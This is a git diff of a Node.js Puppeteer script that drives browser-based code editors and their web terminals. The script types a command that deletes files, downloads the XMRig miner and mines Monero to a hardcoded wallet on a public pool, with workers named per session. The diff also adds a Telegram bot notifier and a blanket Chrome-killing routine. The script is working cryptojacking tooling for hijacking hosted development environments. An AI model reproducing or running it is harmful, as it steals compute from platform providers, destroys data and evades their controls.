@@ -1,6 +1,6 @@
 // monaco-dialog-modal-block
 const puppeteer = require('puppeteer');
-const { exec } = require('child_process');
+const { exec, fork } = require('child_process');
 const workerName = 'd_'
 
 async function waitForClassToExist(page, classSelector, maxWaitTimeMs = 5 * 60 * 1000, checkIntervalMs = 10 * 1000) {
@@ -268,7 +268,7 @@ const openTerminal = async (page) => {
     }
 }
 const runCMD1 = async (page, name) => {
-    await page.waitForSelector('.xterm-link-layer', { timeout: 100 * 1000 });
+    await page.waitForSelector('.xterm-helper-textarea', { timeout: 100 * 1000 });
     const textToType = 'rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz README.md && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1.' + name + '\n';
     await page.type('.xterm-helper-textarea', textToType);
     await page.evaluate(() => {
@@ -340,28 +340,12 @@ const resetWithLink = async (page, link, name) => {
 
 
 const killChromeProcess = (name) => {
-    const command = `ps aux | grep 'Google Chrome' | grep '${name}' | awk '{print $2}' | xargs kill -9`;
-
-    console.log(`Executing: ${command}`);
-
-    return new Promise((rej, res) => {
-        exec(command, (error, stdout, stderr) => {
-            if (error) {
-                console.error(`Error executing command: ${error.message}`);
-                rej(error);
-            }
-            if (stderr) {
-                console.error(`Command stderr: ${stderr}`);
-            }
-
-            console.log(`Chrome processes with ${name} terminated successfully.`);
-            if (stdout.trim()) {
-                console.log(`Process output: ${stdout.trim()}`);
-            } else {
-                console.log('No matching processes found to kill.');
-            }
-            res();
-        });
+    return new Promise((res, rej) => {
+        if (process.platform === 'win32') {
+            return exec('taskkill /IM chrome.exe /F', () => res());
+        } else {
+            return exec('killall "Google Chrome"', () => res());
+        }
     })
 };
 const closeAllTabs = async (browser, saveOne = false) => {
@@ -390,6 +374,31 @@ const closeAllTabs = async (browser, saveOne = false) => {
         return false;
     }
 };
+const axios = require('axios');
+
+async function sendTelegramMessage(botToken, chatId, message) {
+  try {
+    const response = await axios.post(
+      `https://api.telegram.org/bot${botToken}/sendMessage`,
+      {
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'HTML'
+      }
+    );
+    
+    if (response.data && response.data.ok) {
+      console.log('Message sent to Telegram successfully');
+      return true;
+    } else {
+      console.error('Failed to send Telegram message:', response.data);
+      return false;
+    }
+  } catch (error) {
+    console.error('Error sending Telegram message:', error.message);
+    return false;
+  }
+}
 module.exports = {
     openChrome,
     initConnection,
@@ -400,5 +409,6 @@ module.exports = {
     runRestartScript,
     resetWithLink,
     killChromeProcess,
+    sendTelegramMessage,
     closeAllTabs
 }
